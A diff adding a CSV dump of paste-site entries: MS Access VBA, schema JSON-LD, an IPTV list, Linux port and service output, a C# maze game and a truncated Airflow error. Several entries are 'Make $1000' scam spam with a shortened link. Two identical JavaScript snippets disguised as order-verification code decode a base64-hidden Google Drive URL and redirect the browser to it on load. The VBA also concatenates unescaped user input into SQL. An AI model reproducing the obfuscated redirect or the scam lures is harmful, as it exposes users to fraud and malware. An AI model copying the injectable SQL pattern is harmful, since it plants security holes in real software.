@@ -1,0 +1,4527 @@
+id,title,username,language,date,content
+hpuVeGfA,Make $1000 15-MINUTES (BEGINNER) 3R,BlackDragonAssasin8,JavaScript,Sunday 6th of April 2025 01:05:00 PM CDT," 
+Pdf https://goo.su/DgLIPOe
+
+
+Ls7FZLyFoA
+"
+dvs8TRYF,MS Access,jdelano,VBScript,Sunday 6th of April 2025 01:00:34 PM CDT,"Option Compare Database
+
+Private Type familyType
+    familyID As Integer
+    lastName As String
+    firstName As String
+    address1 As String
+    address2 As String
+    city As String
+    state As String
+    zipCode As String
+End Type
+
+Dim familyArray() As familyType
+Dim currentArrayIndex As Integer
+Dim selectedPlate As String
+
+Private Sub btnNewFamily_Click()
+    
+    ' indicate a new family is being added, set teh user at the lastname to begin and enable the save button
+    lblFamilyTitle.Caption = ""New Family""
+    txtLastName.SetFocus
+    
+    currentArrayIndex = 0 ' this makes the next like clear the form
+    
+    DisplayAssignedFamily
+    
+    btnNewFamily.Enabled = False
+    btnSaveFamily.Enabled = True
+    
+    SetPreNextButtonState
+    
+End Sub
+
+Private Sub btnNextFamily_Click()
+
+    ' display the next family assigned to the plate
+    currentArrayIndex = currentArrayIndex + 1
+    DisplayAssignedFamily
+    
+    SetPreNextButtonState
+End Sub
+
+Private Sub btnPreviousFamily_Click()
+
+    ' display the previous family assigned to the plate
+    currentArrayIndex = currentArrayIndex - 1
+    DisplayAssignedFamily
+    
+    SetPreNextButtonState
+    
+End Sub
+
+Private Sub btnSaveFamily_Click()
+
+    If lblFamilyTitle.Caption = ""New Family"" Then
+        SaveNewFamilyData
+    Else
+        SaveEditedFamilyData
+    End If
+    
+End Sub
+
+Private Sub SaveNewFamilyData()
+
+    Dim validateResult As String
+    validateResult = ValidateFamilyData
+    
+    If Len(validateResult) > 0 Then
+        MsgBox validateResult, vbExclamation, ""Failed Validation""
+        Exit Sub
+    End If
+
+    ' save the new family
+    Dim insertSQL As String
+    insertSQL = ""Insert into tblFamilies (StatePlate, LastName, FirstName, Address1, Address2, City, State, ZipCode) "" & _
+        ""Values ('"" & selectedPlate & ""',""
+    
+    If UBound(familyArray) = 0 Then
+        ' there are no family records for this plate
+        currentArrayIndex = 1
+        
+    Else
+        currentArrayIndex = currentArrayIndex + 1
+    End If
+    
+    ReDim Preserve familyArray(UBound(familyArray) + 1)
+    
+    ' add each value to the insert query
+    Dim c As Control
+    For Each c In Me.Controls
+        If TypeOf c Is TextBox Then
+            If c.Tag = ""FamilyTextBox"" Then
+                c.SetFocus
+                Select Case c.Name
+                    Case ""txtLastName""
+                        insertSQL = insertSQL & ""'"" & Replace(c.Text, ""'"", ""''"") & ""',""
+                        familyArray(currentArrayIndex).lastName = c.Text
+                        
+                    Case ""txtFirstName""
+                        insertSQL = insertSQL & ""'"" & Replace(c.Text, ""'"", ""''"") & ""',""
+                        familyArray(currentArrayIndex).firstName = c.Text
+                        
+                    Case ""txtAddress1""
+                        insertSQL = insertSQL & ""'"" & Replace(c.Text, ""'"", ""''"") & ""',""
+                        familyArray(currentArrayIndex).address1 = c.Text
+                        
+                    Case ""txtAddress2""
+                        insertSQL = insertSQL & ""'"" & Replace(c.Text, ""'"", ""''"") & ""',""
+                        familyArray(currentArrayIndex).address2 = c.Text
+                        
+                    Case ""txtCity""
+                        insertSQL = insertSQL & ""'"" & Replace(c.Text, ""'"", ""''"") & ""',""
+                        familyArray(currentArrayIndex).city = c.Text
+                        
+                    Case ""txtState""
+                        insertSQL = insertSQL & ""'"" & c.Text & ""',""
+                        familyArray(currentArrayIndex).state = c.Text
+                        
+                    Case ""txtZipCode""
+                        insertSQL = insertSQL & ""'"" & c.Text & ""')""
+                        familyArray(currentArrayIndex).zipCode = c.Text
+                
+                End Select
+                
+            End If
+        End If
+    Next c
+    
+    CurrentDb.Execute insertSQL
+    
+    ' update the array with the id assigned to the family inserted into the table
+    Dim rs As Recordset
+    Set rs = CurrentDb.OpenRecordset(""Select max(id) from tblFamilies where StatePlate='"" & selectedPlate & ""'"", dbOpenSnapshot)
+    familyArray(currentArrayIndex).familyID = rs(0)
+    rs.Close
+    
+    btnSaveFamily.Enabled = False ' save is done
+    btnNewFamily.Enabled = True   ' a new family can be added now
+    
+    lblFamilyTitle.Caption = ""Family "" & CStr(currentArrayIndex) & "" of "" & CStr(UBound(familyArray) - 1)
+    
+    ' fill some data for today's visit
+    lblSelectedFamily.Caption = familyArray(currentArrayIndex).lastName & "", "" & familyArray(currentArrayIndex).firstName
+    lblVisitDateTime.Caption = Format(Now, ""MM/dd/yy hh:mm:ss AM/PM"")
+    
+    ' put the user in the first count field for today's visit
+    Me.txtCountHispanic.SetFocus
+    
+    ' re-enable prev and next if needed
+    SetPreNextButtonState
+    
+End Sub
+
+Private Sub SaveEditedFamilyData()
+
+    Dim validateResult As String
+    validateResult = ValidateFamilyData
+    
+    If Len(validateResult) > 0 Then
+        MsgBox validateResult, vbExclamation, ""Failed Validation""
+        Exit Sub
+    End If
+
+    ' save the pending edits
+    Dim fieldName As String
+    
+    Dim c As Control
+    For Each c In Me.Controls
+        If TypeOf c Is TextBox Then
+            If c.Tag = ""FamilyTextBox"" Then
+                ' if even 1 textbox is marked yellow than an edit hasn't been saved
+                If c.BackColor = vbYellow Then
+                    Select Case c.Name
+                        Case ""txtLastName""
+                            fieldName = ""lastName""
+                        Case ""txtFirstName""
+                            fieldName = ""firstName""
+                        Case ""txtAddress1""
+                            fieldName = ""address1""
+                        Case ""txtAddress2""
+                            fieldName = ""address2""
+                        Case ""txtCity""
+                            fieldName = ""city""
+                        Case ""txtState""
+                            fieldName = ""state""
+                        Case ""txtZipCode""
+                            fieldName = ""zipCode""
+                    
+                    End Select
+                
+                    SaveEditedValue c, fieldName
+                    c.BackColor = vbWhite
+                End If
+            End If
+        End If
+    Next c
+    
+    btnSaveFamily.Enabled = False ' save is done
+    btnNewFamily.Enabled = True   ' a new family can be added now
+    
+    ' re-enable prev and next if needed
+    SetPreNextButtonState
+End Sub
+
+
+Private Sub SetPreNextButtonState()
+
+    ' set the state of teh new and prev buttons
+    btnPreviousFamily.Enabled = currentArrayIndex > 1 And lblFamilyTitle.Caption <> ""New Family""
+    btnNextFamily.Enabled = currentArrayIndex < UBound(familyArray) - 1 And lblFamilyTitle.Caption <> ""New Family""
+
+End Sub
+
+Private Sub SaveEditedValue(txtBox As TextBox, fieldName As String)
+
+    ' write the edit to the database - use chr(34) so that if there is an ' in the field it won't cause a query error
+    txtBox.SetFocus
+    CurrentDb.Execute ""Update tblFamilies Set "" & fieldName & ""="" & Chr(34) & txtBox.Text & Chr(34) & "" where id="" & familyArray(currentArrayIndex).familyID
+
+    ' save the new value to the array as well
+    Select Case txtBox.Name
+        Case ""txtLastName""
+            familyArray(currentArrayIndex).lastName = txtBox.Text
+        Case ""txtFirstName""
+            familyArray(currentArrayIndex).firstName = txtBox.Text
+        Case ""txtAddress1""
+            familyArray(currentArrayIndex).address1 = txtBox.Text
+        Case ""txtAddress2""
+            familyArray(currentArrayIndex).address2 = txtBox.Text
+        Case ""txtCity""
+            familyArray(currentArrayIndex).city = txtBox.Text
+        Case ""txtState""
+            familyArray(currentArrayIndex).state = txtBox.Text
+        Case ""txtZipCode""
+            familyArray(currentArrayIndex).zipCode = txtBox.Text
+    
+    End Select
+    
+    ' check to see if the first or last name was edited, if so update the value in today's visit section
+    If InStr(txtBox.Name, ""name"") > 0 Then lblSelectedFamily.Caption = familyArray(currentArrayIndex).lastName & "", "" & familyArray(currentArrayIndex).firstName
+    
+End Sub
+
+
+Private Sub btnSavePlate_Click()
+
+    ' the plate was not found in the plates table, the user has selected to save the plate to the database
+    txtPlate.SetFocus
+    selectedPlate = txtPlate.Text
+    
+    If MsgBox(""Are you sure you want to save the plate '"" & selectedPlate & ""'?"", vbYesNo, ""Confirm New Plate"") = vbNo Then Exit Sub
+        
+    ' insert the plate number in the database
+    CurrentDb.Execute ""Insert Into tblPlates Values ('"" & selectedPlate & ""');""
+    
+    btnSavePlate.Enabled = False ' no longer needs to be enabled as the plate has been saved
+
+    btnNewFamily_Click  ' set the user in the add new family mode
+    
+End Sub
+
+Private Sub Form_Activate()
+    
+    txtPlate.SetFocus
+    txtPlate.Text = """"
+    
+    lbMatchingPlates.Selected(0) = False
+       
+End Sub
+
+Private Sub lbMatchingPlates_Click()
+
+    ' exit the click event if there is nothing in the listbox
+    If IsNull(lbMatchingPlates.ItemData(0)) Then Exit Sub
+
+    ' reset the move buttons
+    btnNextFamily.Enabled = False
+    btnPreviousFamily.Enabled = False
+
+    ' find the families assigned to the selected plate
+    selectedPlate = lbMatchingPlates.ItemData(lbMatchingPlates.ListIndex)
+    
+    Dim familyRS As Recordset
+    Set familyRS = CurrentDb.OpenRecordset(""Select * from tblFamilies Where StatePlate='"" & selectedPlate & ""' Order by ID"", dbOpenSnapshot)
+    
+    ReDim familyArray(familyRS.RecordCount + 1)
+    
+    ' if more than 1 family then display the count and enable the next record button
+    If familyRS.RecordCount > 1 Then
+        lblFamilyTitle.Caption = ""Family 1 of "" & CStr(familyRS.RecordCount)
+        btnNextFamily.Enabled = True
+        
+        ' fill the array that will be used by the next and prev buttons
+        Dim familyCount As Integer
+        
+        familyCount = 1
+        Do While Not familyRS.EOF
+            familyArray(familyCount).familyID = familyRS(""ID"")
+            familyArray(familyCount).lastName = familyRS(""lastname"")
+            familyArray(familyCount).firstName = familyRS(""firstname"")
+            familyArray(familyCount).address1 = familyRS(""Address1"")
+            familyArray(familyCount).address2 = familyRS(""Address2"") & """"
+            familyArray(familyCount).city = familyRS(""city"")
+            familyArray(familyCount).state = familyRS(""state"")
+            familyArray(familyCount).zipCode = familyRS(""zipcode"")
+            familyRS.MoveNext
+            
+            familyCount = familyCount + 1
+        Loop
+        
+    Else
+        lblFamilyTitle.Caption = ""Family""
+        
+        familyArray(1).familyID = familyRS(""ID"")
+        familyArray(1).lastName = familyRS(""lastname"")
+        familyArray(1).firstName = familyRS(""firstname"")
+        familyArray(1).address1 = familyRS(""Address1"")
+        familyArray(1).address2 = familyRS(""Address2"") & """"
+        familyArray(1).city = familyRS(""city"")
+        familyArray(1).state = familyRS(""state"")
+        familyArray(1).zipCode = familyRS(""zipcode"")
+        
+    End If
+    
+    familyRS.Close
+    Set familyRS = Nothing
+    
+    currentArrayIndex = 1
+    
+    btnNewFamily.Enabled = True
+    
+    ' display the family record
+    DisplayAssignedFamily
+    
+End Sub
+
+Private Sub DisplayAssignedFamily()
+
+    ' fill the controls with family data
+    txtLastName.Value = familyArray(currentArrayIndex).lastName
+    txtFirstName.Value = familyArray(currentArrayIndex).firstName
+    txtAddress1.Value = familyArray(currentArrayIndex).address1
+    txtAddress2.Value = familyArray(currentArrayIndex).address2
+    txtCity.Value = familyArray(currentArrayIndex).city
+    txtState.Value = familyArray(currentArrayIndex).state
+    txtZipCode.Value = familyArray(currentArrayIndex).zipCode
+
+    If currentArrayIndex > 0 Then
+        ' reuse the section of the family title that has the number of families assigned to the plate
+        ' but increment the number that is being viewed
+        lblFamilyTitle.Caption = ""Family "" & CStr(currentArrayIndex) & Mid(lblFamilyTitle.Caption, InStr(lblFamilyTitle.Caption, "" of""))
+        
+        ' fill some data for today's visit
+        lblSelectedFamily.Caption = familyArray(currentArrayIndex).lastName & "", "" & familyArray(currentArrayIndex).firstName
+        lblVisitDateTime.Caption = Format(Now, ""MM/dd/yy hh:mm:ss AM/PM"")
+        
+        ' put the user in the first count field for today's visit
+        Me.txtCountHispanic.SetFocus
+    Else
+        ' if the index = 0 then the family data section was reset
+        lblSelectedFamily.Caption = """"
+        lblVisitDateTime.Caption = """"
+    End If
+    
+    SetPreNextButtonState
+    
+End Sub
+
+Private Function ValidateFamilyData() As String
+
+    Dim dataValidationMsg As String
+    Dim minLength As Integer
+    Dim maxLength As Integer
+    
+    dataValidationMsg = """"
+    
+    Dim c As Control
+    For Each c In Me.Controls
+        If TypeOf c Is TextBox Then
+            If c.Tag = ""FamilyTextBox"" Then
+                ' set the expected min and max length of fields to test for
+                c.SetFocus
+                Select Case c.Name
+                    Case ""txtLastName""
+                        minLength = 2
+                        maxLength = 50
+                        
+                    Case ""txtFirstName""
+                        minLength = 2
+                        maxLength = 50
+                        
+                    Case ""txtAddress1""
+                        minLength = 10
+                        maxLength = 150
+
+                    Case ""txtAddress2""
+                        minLength = 0
+                        maxLength = 150
+
+                    Case ""txtCity""
+                        minLength = 3
+                        maxLength = 100
+
+                    Case ""txtState""
+                        minLength = 2
+                        maxLength = 2
+
+                    Case ""txtZipCode""
+                        minLength = 5
+                        maxLength = 5
+                
+                        If Val(c.Text) = 0 Then
+                            dataValidationMsg = ""The Zip Code must be numeric"" & vbCrLf
+                        End If
+                End Select
+            
+                If Len(c.Text) < minLength Or Len(c.Text) > maxLength Then
+                    dataValidationMsg = dataValidationMsg & ""The "" & Replace(c.Name, ""txt"", """") & "" value must be 2 characters"" & vbCrLf
+                End If
+            
+            End If
+            
+        End If
+    Next c
+    
+    ' return any message minus the last vbCrLf
+    If Len(ValidateFamilyData) > 0 Then ValidateFamilyData = Left(dataValidationMsg, Len(dataValidationMsg) - 1) Else ValidateFamilyData = """"
+    
+    
+End Function
+
+Private Sub handleFamilyTextChange(txtBox As TextBox)
+
+    ' should the save button be available - because of this one change?
+    ' all fields require values except for the address2 field
+    ' or if the user is adding a new family to a plate there is no need to indicate an edit
+    If (txtBox.Text = """" And txtBox.Name <> ""txtAddress2"") Or lblFamilyTitle.Caption = ""New Family"" Then Exit Sub
+    
+    Dim stateOfSaveButton As Boolean
+    Select Case txtBox.Name
+        Case ""txtLastName""
+            stateOfSaveButton = txtBox.Text <> familyArray(currentArrayIndex).lastName
+            
+        Case ""txtFirstName""
+            stateOfSaveButton = txtBox.Text <> familyArray(currentArrayIndex).firstName
+            
+        Case ""txtAddress1""
+            stateOfSaveButton = txtBox.Text <> familyArray(currentArrayIndex).address1
+            
+        Case ""txtAddress2""
+            stateOfSaveButton = txtBox.Text <> familyArray(currentArrayIndex).address2
+            
+        Case ""txtCity""
+            stateOfSaveButton = txtBox.Text <> familyArray(currentArrayIndex).city
+            
+        Case ""txtState""
+            stateOfSaveButton = txtBox.Text <> familyArray(currentArrayIndex).state
+            
+        Case ""txtZipCode""
+            stateOfSaveButton = txtBox.Text <> familyArray(currentArrayIndex).zipCode
+    
+    End Select
+    
+    ' show or remove that the field has changed and needs to be saved
+    If stateOfSaveButton Then txtBox.BackColor = vbYellow Else txtBox.BackColor = vbWhite
+    
+    btnSaveFamily.Enabled = stateOfSaveButton
+        
+    If txtBox.BackColor = vbWhite Then
+        ' if the box was set to white then check the other family data fields for changes needing to be saved
+        Dim c As Control
+        For Each c In Me.Controls
+            If TypeOf c Is TextBox Then
+                If c.Tag = ""FamilyTextBox"" Then
+                    ' if even 1 textbox is colored yellow than an edit hasn't been saved
+                    If c.BackColor = vbYellow Then btnSaveFamily.Enabled = True
+                End If
+            End If
+        Next c
+    End If
+    
+    ' the new, previous, or next buttons can't be enabled if there is a save pending
+    btnNewFamily.Enabled = Not btnSaveFamily.Enabled
+    btnPreviousFamily.Enabled = Not btnSaveFamily.Enabled
+    btnNextFamily.Enabled = Not btnSaveFamily.Enabled
+    
+End Sub
+
+Private Sub txtAddress1_Change()
+    handleFamilyTextChange txtAddress1
+End Sub
+
+Private Sub txtAddress2_Change()
+    handleFamilyTextChange txtAddress2
+End Sub
+
+Private Sub txtCity_Change()
+    handleFamilyTextChange txtCity
+End Sub
+
+Private Sub txtFirstName_Change()
+    handleFamilyTextChange txtFirstName
+End Sub
+
+Private Sub txtLastName_Change()
+    handleFamilyTextChange txtLastName
+End Sub
+
+Private Sub txtState_Change()
+    handleFamilyTextChange txtState
+End Sub
+
+Private Sub txtZipCode_Change()
+    handleFamilyTextChange txtZipCode
+End Sub
+
+Private Sub txtPlate_Change()
+    
+    ' fill the listbox with the matching plates if there is text in the plate text box
+    If Len(txtPlate.Text) > 0 Then
+        lbMatchingPlates.RowSource = ""SELECT tblPlates.StatePlate FROM tblPlates "" & _
+        ""WHERE (((tblPlates.StatePlate) Like "" & Chr(34) & ""*"" & txtPlate.Text & ""*"" & Chr(34) & "")) ORDER BY tblPlates.StatePlate;""
+
+    Else
+        lbMatchingPlates.RowSource = ""Select top 1 '' as StatePlate from tblPlates""
+    End If
+    
+    ' if there aer no matches, and there is a plate entered in the textbox, enable the ""Add Plate"" button
+    ' to save the plate to the database
+    btnSavePlate.Enabled = IIf(IsNull(lbMatchingPlates.ItemData(0)), """", lbMatchingPlates.ItemData(0)) = """" And Len(txtPlate.Text) > 0
+    
+    'btnNewFamily.Enabled = False
+    'btnSaveFamily.Enabled = False
+        
+    ReDim familyArray(0)
+    
+    currentArrayIndex = 0
+    
+    DisplayAssignedFamily
+    
+End Sub
+
+
+"
+pv3kjpq8,Untitled,WantingTrae,JavaScript,Sunday 6th of April 2025 12:52:18 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/57769/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+0UUbCbgP,JSON-LD combinado para Event + Product + LocalBusiness,El_Rizos,JSON,Sunday 6th of April 2025 12:50:17 PM CDT,"<script type=""application/ld+json"">
+[
+  {
+    ""@context"": ""https://schema.org"",
+    ""@type"": ""Event"",
+    ""name"": ""Free Tour por Elche"",
+    ""startDate"": ""2025-02-20T10:00:00+01:00"",
+    ""endDate"": ""2025-02-20T12:00:00+01:00"",
+    ""eventAttendanceMode"": ""https://schema.org/OfflineEventAttendanceMode"",
+    ""eventStatus"": ""https://schema.org/EventScheduled"",
+    ""description"": ""Descubre el centro histórico de Elche en este Free Tour con guías locales. Incluye el Palmeral, la Basílica de Santa María y otros lugares emblemáticos."",
+    ""image"": [
+      ""https://tengountour.com/wp-content/uploads/2025/02/tour-elche.jpg""
+    ],
+    ""location"": {
+      ""@type"": ""Place"",
+      ""name"": ""Plaza del Congreso Eucarístico"",
+      ""address"": {
+        ""@type"": ""PostalAddress"",
+        ""streetAddress"": ""Plaza del Congreso Eucarístico"",
+        ""addressLocality"": ""Elche"",
+        ""postalCode"": ""03202"",
+        ""addressCountry"": ""ES""
+      }
+    },
+    ""organizer"": {
+      ""@type"": ""Organization"",
+      ""name"": ""Tengo un Tour"",
+      ""url"": ""https://tengountour.com""
+    },
+    ""offers"": {
+      ""@type"": ""Offer"",
+      ""url"": ""https://tengountour.com/2025/02/20/free-tour-elche/"",
+      ""price"": ""0"",
+      ""priceCurrency"": ""EUR"",
+      ""availability"": ""https://schema.org/InStock"",
+      ""validFrom"": ""2025-01-01T00:00:00+01:00""
+    }
+  },
+  {
+    ""@context"": ""https://schema.org"",
+    ""@type"": ""Product"",
+    ""name"": ""Free Tour por Elche"",
+    ""image"": ""https://tengountour.com/wp-content/uploads/2025/02/tour-elche.jpg"",
+    ""description"": ""Tour gratuito disponible todos los días por el centro de Elche. Reserva tu plaza online."",
+    ""brand"": {
+      ""@type"": ""Organization"",
+      ""name"": ""Tengo un Tour""
+    },
+    ""offers"": {
+      ""@type"": ""Offer"",
+      ""price"": ""0"",
+      ""priceCurrency"": ""EUR"",
+      ""availability"": ""https://schema.org/InStock"",
+      ""url"": ""https://tengountour.com/2025/02/20/free-tour-elche/""
+    }
+  },
+  {
+    ""@context"": ""https://schema.org"",
+    ""@type"": ""LocalBusiness"",
+    ""name"": ""Tengo un Tour"",
+    ""image"": ""https://tengountour.com/logo.png"",
+    ""url"": ""https://tengountour.com"",
+    ""telephone"": ""+34 600 000 000"",
+    ""address"": {
+      ""@type"": ""PostalAddress"",
+      ""streetAddress"": ""Calle Mayor 1"",
+      ""addressLocality"": ""Elche"",
+      ""postalCode"": ""03202"",
+      ""addressCountry"": ""ES""
+    },
+    ""openingHours"": ""Mo-Su 09:00-18:00"",
+    ""priceRange"": ""0€ - 20€""
+  }
+]
+</script>
+"
+VTtfAs22,EARN $900 INSTANTLY 2025 Z1,BlackDragonAssasin8,JavaScript,Sunday 6th of April 2025 12:49:04 PM CDT," 
+Pdf https://goo.su/DgLIPOe
+
+
+REOWFK1DZ0
+"
+s4gGgjp4,canalesRevision3,martinmosk3,JSON,Sunday 6th of April 2025 12:38:45 PM CDT,"{
+  ""status"": ""false"",
+  ""message"": ""Data fetched successfully!"",
+  ""iptv"": [
+    {
+      ""id"": ""2"",
+      ""name"": ""RTQ Querétaro"",
+      ""useragent"": """",
+      ""url"": ""https://59d39900ebfb8.streamlock.net/rytqrolive/rytqrolive/playlist.m3u8"",
+      ""imagUrl"": "" "",
+      """": """"
+    },
+    {
+      ""id"": ""2"",
+      ""name"": ""Jalisco Tv "",
+      ""useragent"": """",
+      ""url"": ""https://video0.rogohosting.com:19360/sisjalisciense/sisjalisciense.m3u8"",
+      ""imagUrl"": "" "",
+      """": """"
+    },
+    {
+      ""id"": ""2"",
+      ""name"": ""RCG"",
+      ""useragent"": "" "",
+      ""url"": ""https://video1.getstreamhosting.com:1936/8172/8172/playlist.m3u8"",
+      ""imagUrl"": "" "",
+      ""player"": ""2"",
+
+      """": """"
+    },
+    {
+      ""id"": ""2"",
+      ""name"": ""Puebla TV"",
+      ""useragent"": "" "",
+      ""url"": ""http://189.240.210.28:1935/envivo/puecom/playlist.m3u8"",
+      ""imagUrl"": "" "",
+      """": """"
+    },
+    {
+      ""id"": ""2"",
+      ""name"": ""TVP Culiacan"",
+      ""useragent"": """",
+      ""url"": ""https://5ca3e84a76d30.streamlock.net/gpacifico1/smil:gpculiacan.smil/playlist.m3u8"",
+      ""imagUrl"": "" "",
+      """": """"
+    }
+  ]
+}"
+nJt0EkYV,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 12:36:51 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/06867/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+pGm8xZv0,Make $1000 15-MINUTES (BEGINNER) TS,BlackDragonAssasin8,JavaScript,Sunday 6th of April 2025 12:33:05 PM CDT," 
+Pdf https://goo.su/DgLIPOe
+
+
+2pTW2sHog4
+"
+X8i7Gu20,ports,fornakter,Bash,Sunday 6th of April 2025 12:31:44 PM CDT,"Netid   State    Recv-Q   Send-Q           Local Address:Port     Peer Address:Port  Process  
+udp     UNCONN   0        0                   127.0.0.54:53            0.0.0.0:*              
+udp     UNCONN   0        0                127.0.0.53%lo:53            0.0.0.0:*              
+udp     UNCONN   0        0          192.168.0.23%wlp2s0:68            0.0.0.0:*              
+tcp     LISTEN   0        4096                127.0.0.54:53            0.0.0.0:*              
+tcp     LISTEN   0        4096             127.0.0.53%lo:53            0.0.0.0:*              
+tcp     LISTEN   0        80                   127.0.0.1:3306          0.0.0.0:*              
+tcp     LISTEN   0        4096                         *:22                  *:*              
+tcp     LISTEN   0        511                          *:80                  *:*              
+tcp     LISTEN   0        511                          *:8080                *:*    "
+MAZz29J7,Brave new world,IGRODELOFF,C#,Sunday 6th of April 2025 12:31:22 PM CDT,"using System;
+
+class Program
+{
+    static char[,] map = new char[,]
+    {
+        {'#','#','#','#','#','#','#','#','#','#'},
+        {'#',' ',' ','#',' ',' ',' ',' ',' ','#'},
+        {'#',' ',' ','#',' ','#','#','#',' ','#'},
+        {'#',' ',' ',' ',' ',' ',' ',' ',' ','#'},
+        {'#','#','#','#',' ','#',' ','#',' ','#'},
+        {'#',' ',' ',' ',' ','#',' ','#',' ','#'},
+        {'#',' ','#','#','#','#',' ',' ',' ','#'},
+        {'#',' ',' ',' ',' ',' ',' ','#',' ','#'},
+        {'#',' ',' ','#',' ','#',' ','#',' ','#'},
+        {'#','#','#','#','#','#','#','#','#','#'},
+    };
+
+    static void DrawMap(int playerX, int playerY)
+    {
+        Console.Clear();
+        for (int y = 0; y < map.GetLength(0); y++)
+        {
+            for (int x = 0; x < map.GetLength(1); x++)
+            {
+                Console.Write(map[y, x]);
+            }
+            Console.WriteLine();
+        }
+        Console.SetCursorPosition(playerX, playerY);
+        Console.Write('@');
+        Console.SetCursorPosition(0, map.GetLength(0));
+    }
+
+    static void TryMove(int deltaX, int deltaY, ref int x, ref int y)
+    {
+        int newX = x + deltaX;
+        int newY = y + deltaY;
+
+        if (newX >= 0 && newX < map.GetLength(1) &&
+            newY >= 0 && newY < map.GetLength(0))
+        {
+            if (map[newY, newX] != '#')
+            {
+                x = newX;
+                y = newY;
+            }
+        }
+    }
+
+    static void Main()
+    {
+        int playerX = 1;
+        int playerY = 1;
+        Console.CursorVisible = false;
+
+        while (true)
+        {
+            DrawMap(playerX, playerY);
+            ConsoleKeyInfo keyInfo = Console.ReadKey(true);
+
+            switch (keyInfo.Key)
+            {
+                case ConsoleKey.UpArrow:
+                    TryMove(0, -1, ref playerX, ref playerY);
+                    break;
+                case ConsoleKey.DownArrow:
+                    TryMove(0, 1, ref playerX, ref playerY);
+                    break;
+                case ConsoleKey.LeftArrow:
+                    TryMove(-1, 0, ref playerX, ref playerY);
+                    break;
+                case ConsoleKey.RightArrow:
+                    TryMove(1, 0, ref playerX, ref playerY);
+                    break;
+                case ConsoleKey.Escape:
+                    return;
+            }
+        }
+    }
+}"
+igPTXRC2,Untitled,fornakter,Bash,Sunday 6th of April 2025 12:26:56 PM CDT,"fornakter@nakter:~$ sudo ss -tuln | grep apache
+fornakter@nakter:~$ sudo ss -tuln | grep LISTEN
+tcp   LISTEN 0      4096            127.0.0.54:53        0.0.0.0:*          
+tcp   LISTEN 0      4096         127.0.0.53%lo:53        0.0.0.0:*          
+tcp   LISTEN 0      80               127.0.0.1:3306      0.0.0.0:*          
+tcp   LISTEN 0      4096                     *:22              *:*          
+tcp   LISTEN 0      511                      *:80              *:*          
+tcp   LISTEN 0      511                      *:8080            *:*          
+fornakter@nakter:~$ sudo systemctl status apache2
+● apache2.service - The Apache HTTP Server
+     Loaded: loaded (/usr/lib/systemd/system/apache2.service; enabled; preset: enabled)
+     Active: active (running) since Sun 2025-04-06 17:06:49 UTC; 15min ago
+       Docs: https://httpd.apache.org/docs/2.4/
+    Process: 999 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
+   Main PID: 1349 (apache2)
+      Tasks: 6 (limit: 4343)
+     Memory: 25.5M (peak: 25.8M)
+        CPU: 619ms
+     CGroup: /system.slice/apache2.service
+             ├─1349 /usr/sbin/apache2 -k start
+             ├─1588 /usr/sbin/apache2 -k start
+             ├─1589 /usr/sbin/apache2 -k start
+             ├─1594 /usr/sbin/apache2 -k start
+             ├─1595 /usr/sbin/apache2 -k start
+             └─1596 /usr/sbin/apache2 -k start
+"
+hpMSQhp2,err,vishneva_olga,Python,Sunday 6th of April 2025 12:26:13 PM CDT,"(Background on this error at: https://sqlalche.me/e/14/f405)
+[2025-04-06T17:10:40.322+0000] {taskinstance.py:1400} INFO - Marking task as FAILED. dag_id=alt_churn, task_id=create_table, execution_date=20250406T171036, start_date=20250406T171040, end_date=20250406T171040
+[2025-04-06T17:10:40.340+0000] {standard_task_runner.py:104} ERROR - Failed to execute job 53 for task create_table ((psycopg2.errors.DuplicateTable) relation ""uq_customer_id"" already exists
+
+[SQL: 
+CREATE TABLE alt_users_churn (
+	id SERIAL NOT NULL, 
+	customer_id VARCHAR, 
+	begin_date TIMESTAMP WITHOUT TIME ZONE, 
+	end_date TIMESTAMP WITHOUT TIME ZONE, 
+	type VARCHAR, 
+	paperless_billing VARCHAR, 
+	payment_method VARCHAR, 
+	monthly_charges FLOAT, 
+	total_charges FLOAT, 
+	internet_service VARCHAR, 
+	online_security VARCHAR, 
+	online_backup VARCHAR, 
+	device_protection VARCHAR, 
+	tech_support VARCHAR, 
